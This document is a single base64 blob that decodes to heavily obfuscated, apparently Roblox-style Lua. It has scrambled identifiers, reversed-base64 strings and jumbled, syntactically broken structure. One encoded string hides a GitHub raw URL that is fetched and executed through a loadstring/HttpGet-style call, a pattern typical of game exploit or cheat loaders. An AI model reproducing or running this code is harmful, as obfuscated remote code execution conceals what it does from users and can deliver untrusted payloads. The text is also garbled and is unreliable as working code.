Y2hoenVuU29MSiIpIHRoZW4KICAgICAgICAgICAgICAgIExUZ1p5dnBqSXogPSB0cnVlLAogICAgICAgICAgICAgICAgTmRTZ2toeHZkTS5RT0RKT2dXTHBuID0gdHJ1ZQoKICAgIEVjenZqVU5SRkkgPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PW9oWnhoVHN1a00iKSkKKQogICAgICAgIHlYa1pIV0hhWU4gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09cFNQTFpTd0d3RiIpCiAgICAgICAgICAgICAgICB2SFNvRHlOY3JFLnRkU2dOcklTSnMgPSBQblFUUUVlbFdJLkp0aHROTUtmU0suSGdzRG1uWHlnVwotLSB3ZFBsbnJ1V3psIGpOaHhuTVNyRUsgYWVOUFF2VUhQZyBlRHJESFZxZmp0IFZ1WFVyT2Z6VFQgVE5ocnBNZVJVdAogICAgZnVuY3Rpb24oKQogICAgICAgIGVuZAogICAgICAgICAgICBlbmQKLS0gU0diSWpKRkVpbiBCdUFzT0hrU1ZCIEJ6eXlNVGFYY04KbG9jYWwgR050cld0WURZViA9ClpkcGNJdEhSVFEoKS5XdVBSQ2tCbUVxID0gdHJ1ZQogICAgICAgIGVuZAogICAgICAgIHFXSWFMTFRuQW0gPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInVPT1lCcFdtbUIiKSwKICAgICAgICAgICAgICAgICAgICAgICAga3FOVXBpUGNLYyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09Z29pYmNUbGxNUyIpLCBMWUtmeVFBY1NFKQpsb2NhbCBmdW5jdGlvbiBydm1uSERVck1iKG9YZllUdkhxbXMpCiAgICAgICAgICAgIC0tICoqbU9HZ1BLdk9PRiBWVXJVVkRNT0taIGF5RWhiZkNYeVMgQm9MaHZmeVpKbSBWbXBXSXdySnp2IGtZT1dSVWpmcnIgRE52T0lzTVhWZSoqCiAgICBrbk53SHpyQktRLkRQRHhDcHdia3MgPSBOQVRDUXBwVkFROndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJkUE9Oc09EdFlIIikpIEJ4dFBVZlRSVEogTkFUQ1FwcFZBUS5Jc3dGbkVvdXlFLmd0RExwYnpNbXYgRWNJeXBPa1FZVSBuaWwKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICkgLS0gbHFpc3BZRlJQeQoKICAgIHNJRk1OYk1pcFEgPSBmYWxzZSwKICAgICAgICAgICAgICAgIGxvY2FsIHlPcUN1Y3FSb3MgPSBJUndWbExIS011OkNFd3dPbE9iSUUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9ZENXaEloU0dlUSIpKQogICAgICAgIGlmIG1laXpnUUJCWmkgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9a2ZBTnJQenFEbSIpIEJ4dFBVZlRSVEogWlduWVRmYW1XWC5IZ3NEbW5YeWdXID09IFdETVBoQWFBb20udHRCQnpoWlRISygiTHJKQUtZaml1ViIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBoWFRtWGtzRkpPIFBjcGNya1JsQnosIHZIU29EeU5jckUgSlpsb3VocEhsVCBjbEpEbHBlYXFLLCBJUndWbExIS011OmZqcGpUUEJHbnUoKSBMSldUZGJQYWx3CmxvY2FsIEp0aHROTUtmU0sgPSBjVFFkUk1IUGJVLkhxSmdueHZhaU06YnBCUmhXY0ZjcChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1vbnRTY1hhWEZnIiksIHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9bFN3U0h5dHZsbyIpLCBzSUZNTmJNaXBRID0gZmFsc2V9KQogICAgbG9jYWwgUWVKTUxTRENiUCA9IHBPb05tRVhIdkwoKQogICAgICAgICAgICAgICAgbG9jYWwgUEpGR2ZYU1dPYSA9IHNsdFBtSkx5bXY6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIldSbG9xZEljRXoiKSkKICAgICAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PVNpVmZlTFJlbWkiKSwgLS0gdFF2SEFoSUp4QSB2V1FnUFNiZUdVCiAgICAgICAgICAgICAgICBsRnZqckpHbW1ULlROQmhaVUdOZmEuUmVxVGVtY3N3ZSA9IHRCemROQmNYTmYublJrRXJHSm5KdygxNDAsIDE0MCwgMjIwKQogICAgewogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIE5BVENRcHBWQVEuSXN3Rm5Fb3V5RS5ndERMcGJ6TW12ID0ga25Od0h6ckJLUS5EUER4Q3B3YmtzCgogICAgelh4WHRDaHRkeSA9IENQZ3BwdXhiTlc6RHdhZlJCb0NlYih7dGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiRGNPQ3FhWXdGSyIpLCBjUGhYZXBZZU5hID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCIxUUROeEVETzVBek53RXpMdm9EWnBSWFp6TlhZNEptYyIpfSksCiAgICAgICAgcGpkSGp0cmFkcihES09naGRqcHJjKQogICAgICAgICAgICBjVFFkUk1IUGJVLmdqdWxGcElKRUc6eGNWeGdtZ01iUSgKICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgb0hNTVN6Q0ROdSA9IHVleUZNeWJBV2QKICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGxvY2FsIFBKRkdmWFNXT2EgPSBzbHRQbUpMeW12OndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJXUmxvcWRJY0V6IikpCi0tIC8vIC8vIC8vIGNUUWRSTUhQYlUgTmNSRk9BdUZXeiAvLyAvLyAvLyAtLQogICAgICAgICAgICBpZiBsRnZqckpHbW1UOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9enJ0VFRLU21maCIpKSBCeHRQVWZUUlRKIGtuTndIenJCS1EuT1dRVmNCdFhLeCB0aGVuCiAgICBmdW5jdGlvbihkaXNiRkhpWU5MKQogICAgfQpsb2NhbCBIRXdLeVVwRWRjID0KICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGdacFJadEZ4QmguWllxTHdJc2JsbihmRVZzS29TRmVRLCBVYklaQUtvcmdCKQogICAgICAgICAgICAgICAgaWYgSGdzRG1uWHlnVyBCeHRQVWZUUlRKIHNsSm1jdFVKWk0gdGhlbgogICAgICAgICAgICAgICAgaVFsbU54SlBwWiA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPTR5YzA1V1p0VkdibEJTU1ZCU2V5RjJjelYyWWw1R0lsaEdkZ1FtYnBaR0kwOW1iZ1FHYjE5MlEiKSwKICAgICAgICAgICAgICAgIGRpc2JGSGlZTkwudGp1V2xUc1h6ZS51aWxKcmFVUmZKID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPUp5ZnZJQ1NKcmUiKQogICAgICAgICAgICAgICAgICAgIHVWRGpvZ1VOU3AgdllrVHVpWnZWZC5Zc2NmV09GWGN0ID09IFdETVBoQWFBb20udHRCQnpoWlRISygiPU9IYUpBakVFbnYiKSB0aGVuCiAgICAgICAgICAgICAgICBReXJHZkJOWFNEKCkKfSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIE5kU2draHh2ZE06VUdQR3JITFNwZyhXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj00MmIwUlhkQ1YyWmgxV1MiKSkgdGhlbgogICAgICAgIGxvY2FsIHF5S0dSeUZiWWYgPSBydm1uSERVck1iKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1uSmpHdUlhRlV3IikgLi4gQUNXS1VNbHlQSCkKICAgICAgICAgICAgICAgICAgICAgICAgaWYgV2dCQVB3Q2lYZCB0aGVuCiAgICAgICAgICAgICAgICBsZWF6QmpDelFnOlVjdGNLZERLckkoclNJWmJIRUhOdywgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJuWmtwb2VpWVlZIiksIG5pbCwgMSkKCiAgICAgICAgICAgICAgICBvRkptcHFUSWFGID0gSkhKUmVrdHZtWDp1U1hwb2t2akRUKCkKICAgICAgICAgICAgZW5kCiAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1ocWJHdUZmSUxEIiksCiAgICAgICAgICAgIEh0ZmxNb2tZeE46VkpNR2NqQXN1ZChtWGxzQ3B4TnZyLmxhaW5Pa2dLZncoUXl6b2RkS2JGRCkpCiAgICBjWHVWb1ZxcWdsLkp0aGZ6S0lXaFcgPSBIcGpLc3JvYVZRLkp0aGZ6S0lXaFcgKyB6RlJFYWhCaGRoLmxhaW5Pa2dLZncoMC41LCAwLjUsIDAuNSkgLS0gcW1reE56ektOQSBtRHV2Z1F3aW1PIE9MZXJoSU5IUm4gZlVhZGFXVWRIdSBkYkdHa0ZlUVdnCgogICAgSHFKZ254dmFpTSA9IENQZ3BwdXhiTlc6RHdhZlJCb0NlYih7dGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT12WnlVUFViZmRYIiksIGNQaFhlcFllTmEgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjFBVE4wSUROekl6TndFekx2b0RacFJYWnpOWFk0Sm1jIil9KSwKbG9jYWwgYndlSnFIelVNSSA9IGNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpxb0xUd3BUdWhZKFdETVBoQWFBb20udHRCQnpoWlRISygieHR3dll2Sk5GeiIpKQogICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIEJvTGh2ZnlaSm0gQnh0UFVmVFJUSiBCb0xodmZ5WkptOndOcUppVGR5cFUoV0RNUGhBYUFvbS50dEJCemhaVEhLKCJjaGh6dW5Tb0xKIikpIHRoZW4KLS0gbWtrSVhoeUZacTpzV013WGJHQUhvKCkKTXBwYmlYWGFvSS5KdGhmektJV2hXID0gTktNSXRITVhnWSgwLjE1KSAtLSBSV2hod0lOTUZqIG1EdXZnUXdpbU8gQmpIc0NmaklEdgotLSAvLyAvLyAvLyBzakpka09rT3BuIC8vIC8vIC8vIC0tCnNtemtmZFhZV2QKY1RRZFJNSFBiVS5IcUpnbnh2YWlNOkF6U1hBUlBuWlAoCiAgICBrRnBiWE5pSURPID0gZnVuY3Rpb24oSGdzRG1uWHlnVykKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICBlbmQsCkhVbUZydGtxbVY6eEZGVUpUUlV6QygKICAgIEZoV1pXQk9hU2woClhpd1plam1wQnguUHNTb1hmb3pxUCA9IFdETVBoQWFBb20udHRCQnpoWlRISygiTElZbEV3VFZGdSIpIC0tIFRBZVpMd1Jkb08gTGp1RXNFblRTViBUWmtUeGZqeGFqIFVVSmFBalZPY2ggZ2l4WFBoc2FKSSBYQ0VUWGFBb2FSCiAgICAgICAgZW5kCmNUUWRSTUhQYlUuSHFKZ254dmFpTTpBelNYQVJQblpQKApiTEx5RUhxWGZaLklGdmJaZ3F6WE0gPSAxCiAgICAgICAgICAgIHZZa1R1aVp2VmQueXlORXRoS2FEQSA9IGZhbHNlCiAgICB0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9ZlpJVGlPU0FSWCIpLAogICAgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPT1BaEdobGhXSnFsIikpOlhiaUFUdmdQVWwodHJ1ZSwgV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9cXBtdnFwQkpVWSIpLCBmYWxzZSwgSVJ3VmxMSEtNdSkKCi0tICAgICBKUkZVQlhucWFaLmxhaW5Pa2dLZncoMSwgdEJ6ZE5CY1hOZi5uUmtFckdKbkp3KDMwLCAzMCwgODApKSAgICAtLSBLSWRucVRjUFNYIGd6U3ljT1FGeUIgKHBaUndkVEFCVmMpCiAgICAgICAgdGFTVHRvVHlQVSA9IElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIkdFcFNpdWlHQlYiKSk6UEJVZGFrbWN6SSgxNjczMjY5NDA1MikudWlsSnJhVVJmSiAuLiBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09clN1SFBld2NHQSIpLAogICAgICAgICAgICAgICAgdVZEam9nVU5TcCB2WWtUdWladlZkLllzY2ZXT0ZYY3QgPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9T0hhSkFqRUVudiIpIHRoZW4KLS0gUnNxY21zdnhubSBtRHV2Z1F3aW1PIFFJWXJvWmhoT2YgTGp1RXNFblRTViBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoInZ4eE1qdllWZFMiKQogICAgUmZtWVpuaW5XZyA9IGJFaElxVHpvVHQgUmZtWVpuaW5XZyAtLSBSdGtWd0xjU2FvIGt2aHFSbFdQdUggaHpQbndzSmllcCBDS211RE1BakVPIGFFRXlDeGVOTUIKLS0gLy8gbWtBdlV3VFVRdSBmTWhOdkliVlRPIC8vIC0tCiAgICBlbmQpCi0tIGxvY2FsIG91TmxnYVJrZlggPSBmaU1td29HSFRkLmxhaW5Pa2dLZncoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PXREREx1SHF4WXEiKSkKICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKDAuMSkKICAgICAgICAgICAgICAgIGhza3RJdmpwcmMgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZCwKCiAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgTkFUQ1FwcFZBUS5IaURGUVlEdUNsLmd0RExwYnpNbXYgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIlFya1pJTGtMdGEiKQogICAgICAgICAgICBpZiBiRWhJcVR6b1R0IHZZa1R1aVp2VmQuck5DUkJhVUdyRiB0aGVuCiAgICBjVFFkUk1IUGJVLlNHYklqSkZFaW46RW1SeGdLeFF1ZigKICAgICAgICBlbmQKY1RRZFJNSFBiVS5pTGRvcEdXVUtSOmJwQlJoV2NGY3AoCiAgICBJUndWbExIS011LlFnRkxvbWFuem86VlB6V1dOb2ZOZigpCiAgICAgICAgbG9jYWwga2pOeGFKQVJ1ZyA9IEdSdEVmbHdYR3cKICAgICAgICAgICAgICAgICAgICBsb2NhbCBCb0xodmZ5WkptID0gd2p5SGplYml6QyBCeHRQVWZUUlRKIHdqeUhqZWJpekM6SXdId29CcWJGbChXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09VWhydFNEb21idSIpKQogICAgICAgICAgICAgICAgcVdJYUxMVG5BbSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPW9ZTGJodGpSVW4iKSwKICAgIElSd1ZsTEhLTXU6Q0V3d09sT2JJRShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj09QWhHaGxoV0pxbCIpKTpYYmlBVHZnUFVsKGZhbHNlLCBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1xcG12cXBCSlVZIiksIGZhbHNlLCBJUndWbExIS011KQogICAgICAgICAgICBpZiBmQlR0WWVWb29kIEJ4dFBVZlRSVEogZkJUdFllVm9vZC5rYmd4ZWxoWU9zIHRoZW4KICAgICAgICAgICAgWlFlRVp6UkFaeSA9IGZhbHNlCgogICAgICAgICAgICAgICAgICAgIGxGdmpySkdtbVQuYUxnREFEdnJRUi5ndERMcGJ6TW12ID0gU21xQVBRU0ZOYgogICAgICAgICAgICBsb2NhbCBQYWp2UGpubXhQID0gSVJ3VmxMSEtNdS50bVpkZGttR01yLlB5ZHhUeHNFREEKICAgICAgICAgICAgICAgICAgICAtLSBvcU5SaUpac0dYIHB6eVN5SGpld1kgZlVhZGFXVWRIdSB6SXBaQ0VFVnNNIENLbXVETUFqRU8gdHhQRGxtQlZZSSBNcWN3QmxpVnlyIE9hUVp5ZmZhYUcKICAgICAgICAgICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1JSWhTUFlOaElCIiksCiAgICBjVFFkUk1IUGJVLlNHYklqSkZFaW46eGNWeGdtZ01iUSgKLS0gTUhpcGx6UFdXeCBiZldPSkxXWnJOIE5iTXZQTm91ZkYgTnNtSk1GZkNSSwogICAgICAgIGpaZHNNT3RpZ2E6QllDUWNBWWdRaigjQW9nTkhOSnZEUiA+IDAgQnh0UFVmVFJUSiBBb2dOSE5KdkRSIEVjSXlwT2tRWVUge1dETVBoQWFBb20udHRCQnpoWlRISygiPT1UbE51UENjd2RHIil9KQpjVFFkUk1IUGJVLnp3VUxUUnFvQ1U6QXpTWEFSUG5aUCh7CgogICAgICAgIEZBd1FUSmZhaXMgPSB0cnVlLCAtLSBtT0dnUEt2T09GIE9hUVp5ZmZhYUcgTU5YTlpjVktOTSBRU3BpZXpHeWNHCiAgICBpZiByeXF6U1dKRlpoIHRoZW4KICAgICAgICAgICAgaVhJcWZiaWd1SCA9IEdSdEVmbHdYR3cKZW5kCiAgICAgICAgICAgICAgICBSSk9BUm1ZV29tOm5sU0FpaWNYaXUoKQpsb2NhbCBsZWF6QmpDelFnID0gSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWplV3l4aFBTTFAiKSkuVWVQWEdkUEpoTy5IVFhxeW5hT1h2CgogICAgICAgIGxvY2FsIEtVUHZPVXVYUG4gPSBaY2ZvVkJzb0RBLmFpRFVrTmhkZVooQ21ldm5iakJQWigpIC0gSGFJcEVWZGZTYSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2Rm9PRG5vdGFVOmNuRWxPdVZzWUgoKQogICAgV0RNUGhBYUFvbS50dEJCemhaVEhLKCJWdXRzcWtFck5EIiksCgogICAgICAgICAgICByZXR1cm4KdllrVHVpWnZWZC5Zc2NmV09GWGN0ID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PUpWVGVacXBvakgiKSAtLSBzSUZNTmJNaXBRIHZNa21yT3VSVVQgUUFHaHRCQlhwZQogICAgY1RRZFJNSFBiVS5TR2JJakpGRWluOnhjVnhnbWdNYlEoCiAgICAgICAgICAgICAgICA5ZTkKICAgIHsKICAgIGZ1bmN0aW9uKEhnc0Rtblh5Z1cpCgogICAgICAgIEp0aGZ6S0lXaFcgPSA1MCwKICAgICAgICBzbEptY3RVSlpNLm1YbHNDcHhOdnIgPSBSUlhSTUNQWlF0ICsgekZSRWFoQmhkaC5sYWluT2tnS2Z3KDAsIGVoTGR3Z1BkYlksIDApCmNUUWRSTUhQYlUuZ2p1bEZwSUpFRzpicEJSaFdjRmNwKAogICAgICAgICAgICAgICAgU2hlYmZIa3ZSaSgKKQogICAgICAgIGVuZApsb2NhbCBzWWRDSHNvdHFQCiAgICByZ3JnREhGdkZFLmNYeUxpRGJUVFAgPSAxCiAgICAgICAgICAgICAgICAgICAgZHlESXprQkhUTTpRVVNiSlNneFlNKFdETVBoQWFBb20udHRCQnpoWlRISygicG9qaGNuc1dZeSIpLCBxc1BsWU1YVnp5LCA1KQogICAgICAgIEZPSVFHWmNqam86bmxTQWlpY1hpdSgpCiAgICAgICAgUHlkeFR4c0VEQS5ETnZPSXNNWFZlLlVjTUJPck51dmQuWUlXV3RSZkpGVSA9IERLT2doZGpwcmMKICAgICAgICAgICAgbG9jYWwgeXZiTnltdVJKaSA9IEh0ZmxNb2tZeE4uc2xKbWN0VUpaTS5XZ3J2bGJsdkxmCiAgICAgICAgdGFTVHRvVHlQVSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPT1OQ2Z2eVpFcXRmIiksCiAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uKCkKLS0gLy8gLy8gLy8gb21EcEdQcXhHQyAvLyAvLyAvLyAtLQopCiAgICAgICAgICAgIEFZbHhzRGpOblEuQU15Y0tBUWhoYShuZGtIclhORWdJKSAtLSBRckl4d1pjdGZEIG5ka0hyWE5FZ0kgZlVhZGFXVWRIdSB6SXBaQ0VFVnNNCiAgICAgICAgaWYKICAgICAgICAgICAgZW5kCiAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgQVlseHNEak5uUS5BTXljS0FRaGhhKFpjZm9WQnNvREEuUW12b3V2UUdtUihuZGtIclhORWdJLCBuZGtIclhORWdJICsgMC41KSkKICAgIHJldHVybiBmYWxzZQogICAgICAgIHRhU1R0b1R5UFUgPSBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj16eWpuUkdCdG5uIiksCn0pCiAgICBIVW1GcnRrcW1WOkRobFlCVXpvSngoCi0tIEFQbW5xQ0tWWVogdkZGWW16TG9pegotLSBNSGlwbHpQV1d4IGJmV09KTFdack4gV1RKeGtSbVRhcyBWUGtwY3F6SWlaCiAgICAgICAgUHlkeFR4c0VEQS5BSGRUdmNrb25jOm56dkZ4VENEY0QoCiAgICAgICAgICAgIFFwUUN6QlVWQ2coV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9YXFpSHhHT1NTaCIpKQoKICAgICAgICBwU1BoTnJGWUxpLm53QVlYZ0x2c0kucndWZ0hFTmpYYzp3TnFKaVRkeXBVKFdETVBoQWFBb20udHRCQnpoWlRISygiZGRSUnVOVUpDeCIpKQpmUHZoTnRJTFN4LlNXemRCbHl4TnogPSAwCiAgICAgICAgICAgIFpRZUVaelJBWnkgQnh0UFVmVFJUSiBkaXNiRkhpWU5MLnVpbEpyYVVSZkogPT0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCJkZFJSdU5VSkN4IikgQnh0UFVmVFJUSiBkaXNiRkhpWU5MLnRqdVdsVHNYemUgQnh0UFVmVFJUSgogICAgewogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWRDV2hJaFNHZVEiKSkuV1NGQ0JBdlFVZiA9IFdETVBoQWFBb20udHRCQnpoWlRISygiPXpOdG1uaXVtUnIiKQogICAgICAgICAgICBpZiBkTlpRU3pRak1vIHRoZW4KICAgIGxvY2FsIHN1bk9VakhVWkMgPSBTbkZDYlpqWHZvLmRqVUNOb0xlWFRbUHlkeFR4c0VEQS51aWxKcmFVUmZKXS5Na2hsdVZWUGluLkJvTGh2ZnlaSm0uSGdzRG1uWHlnVwplbmQKICAgICAgICAgICAgKQogICAgUHlkeFR4c0VEQS5wU1BoTnJGWUxpLmlOVlBOZUplQmE6bnp2RnhUQ0RjRChmdW5jdGlvbihOZFNna2h4dmRNKQogICAgICAgIGZpcHJsWW1XdnIgPSAxNDAsCiAgICAgICAgICAgICAgICBBWWx4c0RqTm5RLkFNeWNLQVFoaGEoMCkKbG9jYWwgSklTaVF2ZE5oTiA9IGZhbHNlCi0tIHVQRW5HWFh4QmMgUnRrVndMY1NhbyB2SkxvaG52SmFkIGtZT1dSVWpmcnIgYndlSnFIelVNSSB5ZUpjVVR0WGdDIGllR1dPVndSRGwgSFVtRnJ0a3FtViBrcm9PeVJ2U1JDCiAgICAgICAgICAgICAgICAgICAgICAgIFhETnJMZ0RMa3Muem1xaVFIRGhiUSA9IHNjVVloRHFBTFMKICAgICAgICAgICAgaWYgdWJ3d1FaT0N5ZiB0aGVuIHVid3dRWk9DeWY6Qlh0RG5zd3VNRSgpIGVuZApsb2NhbCBvRkptcHFUSWFGICAtLSBIcWZYYXN2T3dLIGJmV09KTFdack4gcGlNeG9FRWdWbyBKSEpSZWt0dm1YIHJDUUpGVWpkYk8KbG9jYWwgUkVva1FRc3RXSCA9IHZOclh2SW1QTEIuVlB6V1dOb2ZOZgogICAgICAgICAgICBsb2NhbCBYallOVGJFVEZsID0ge30KICAgICAgICBlbmQKICAgIH0KICAgIFdETVBoQWFBb20udHRCQnpoWlRISygiPT13YlVWT0pYZG5jIiksCiAgICBTR2JJakpGRWluID0gQ1BncHB1eGJOVzpEd2FmUkJvQ2ViKHt0YVNUdG9UeVBVID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9PWFUZ0lvTnZFQlgiKSwgY1BoWGVwWWVOYSA9IFdETVBoQWFBb20udHRCQnpoWlRISygiNUFET3hZVE8wTXpOd0V6THZvRFpwUlhaek5YWTRKbWMiKX0pLAogICAgICAgIGhYVG1Ya3NGSk8gUGNwY3JrUmxCeiwgdkhTb0R5TmNyRSBKWmxvdWhwSGxUIEduVXZMSG9zdU4oSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPXNsTFBLSEJZRmYiKSk6RFFxeXhmd2tTZihXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIj1EZVFNSExUZ2FiIikpKSBMSldUZGJQYWx3CmVuZAotLSBIcUd4UGJkck1jIGZNaE52SWJWVE8KICAgICAgICBGcUN1cnlIQmRjID0gV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9ZGF0a0dFS1FQUyIpLAoKICAgICAgICBlbmQKICAgICAgICAgICAgbG9jYWwgRFFvaEV5U2N2RyA9IERERVJPYVdYRVouSGdzRG1uWHlnVwogICAgewogICAgICAgIEFZbHhzRGpOblEubmRrSHJYTkVnSSgKCiAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgewogICAgICAgIC0tIHNGcU5JcXVDUksgWWVyY2x0Q0F5ViBNcWN3QmxpVnlyIElibm5hY1pmelkgZldCbmJDWnBRQyB2V1FnUFNiZUdVIGZRTVJReGRyRW8KICAgICAgICAgICAgKQogICAgICAgICAgICBpZiBiRWhJcVR6b1R0IG9GSm1wcVRJYUYgdGhlbgogICAgICAgIHNtemtmZFhZV2QKICAgICAgICBoV09HUVdibkFVID0gcVpLSWVOaVdHdS50SU9oUVF6WU13Lm54aUdrcFNmb1ogLS0gckdseERDWFFPUiB2TWttck91UlVUIGh6UG53c0ppZXAgdkpMb2hudkphZCBPdFNURnhuU2NrCiAgICBXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjA1V2R2MVdRNVZuUSIpLApYaXdaZWptcEJ4LlVoaXVUUG5YVUQgPSB0cnVlCiAgICBpZiBaa1VSZ3RjbVBCIHRoZW4KICAgICAgICB3cG10ekpoZnFKKGZhbHNlKQpsb2NhbCBIVW1GcnRrcW1WID0gdE5FeEhpVVRsVChJUndWbExIS011OlFaS1hraWtDaXcoV0RNUGhBYUFvbS50dEJCemhaVEhLKCI9NFdZb1JGZHVWV2RzWjBMdWxXWXQ5eWNrRldabzl5Y21WbWN2a1VWMDVXWjF4bVJ2a25lMDVXWW9SM0x0OTJZdVFuYmxSbmJ2Tm1jbE5YZGlWSGEwbDJadWNYWXk5eUw2TUhjMFJIYSIpKSkoKQogICAgbXpRQmJkclF4VC52VXFUWGhoZEZtOm56dkZ4VENEY0QoCmJMTHlFSHFYZlouUmVxVGVtY3N3ZSA9IHRCemROQmNYTmYublJrRXJHSm5KdygyMjAsIDIyMCwgMjIwKSAtLSBNb05QRGtSVHdjIHdUUmhzV2dOUUotd1RSaHNXZ05RSiBmU1BzYmh0dFl2CkZ6TFRmSENqUHA6SlBFc29na2diVCgKICAgICAgICAgICAgaWYgSVJ3VmxMSEtNdTpDRXd3T2xPYklFKFdETVBoQWFBb20udHRCQnpoWlRISygiPWRDV2hJaFNHZVEiKSk6d05xSmlUZHlwVShXRE1QaEFhQW9tLnR0QkJ6aFpUSEsoIjV0MlUiKSkgdGhlbgogICAgRWN6dmpVTlJGSS5KdGhmektJV2hXID0gekZSRWFoQmhkaC5sYWluT2tnS2Z3KDEwLCAxLCAxMCkgCiAgICAgICAgICAgICAgICB6R29kUmppSGV4ID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbXpRQmJkclF4VC52TnJYdkltUExCOlZQeldXTm9mTmYoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBsb2NhbCBIamhMckJjdEttCiAgICBlbmQKICAgIEhVbUZydGtxbVY6eEZGVUpUUlV6QygKICAgICAgICAtLSBZU2dSSXhLbVdxIHlJTmJ3dFFib0wgTGp1RXNFblRTViBhUHN5Tlp4T2F1IG1HcHJ0S1Bha1AKICAgICAgICBpZiBiRWhJcVR6b1R0IEhQWnNQc2xrVkEgdGhlbgogICAgICAgICAgICAgICAgICAgIG1laXpnUUJCWmkgPSBGT2lVTk5ZSEpRIEJ4dFBVZlRSVEogRk9pVU5OWUhKUS5IZ3NEbW5YeWdXIEVjSXlwT2tRWVUgbmlsCikKLS0gaE5wb0VKRHNkcCBjSEpWSWZtSVBKIEhFbHpsV05IbUYga1NIcXhBTlNYQyBaVnN6aUJLaURPLCBVbHpuZnFPWnJuIHB3R3ZaY2ZIUnksIFhmSHJUUFVFd04gYmxMR3FjYlFwTQogICAgICAgICAgICBsb2NhbCBIdGZsTW9rWXhOID0gUGFqdlBqbm14UC5ETnZPSXNNWFZlIEVjSXlwT2tRWVUgUGFqdlBqbm14UC5BSGRUdmNrb25jOlZQeldXTm9mTmYoKQogICAgewogICAgaWYgYkVoSXFUem9UdCBzbEptY3RVSlpNIHRoZW4gcmV0dXJuIGVuZAogICAgZW5kCiAgICAgICAgaWYga1NTUHhFekRaViB0aGVuCiAgICAgICAgICAgIGlmIGNISlZJZm1JUEouYWxlQVZmcXN4eCA9PSBuaWwgdGhlbgpsb2NhbCBaUWVFWnpSQVp5ID0gZmFsc2UKICAgIGtGcGJYTmlJRE8gPSBm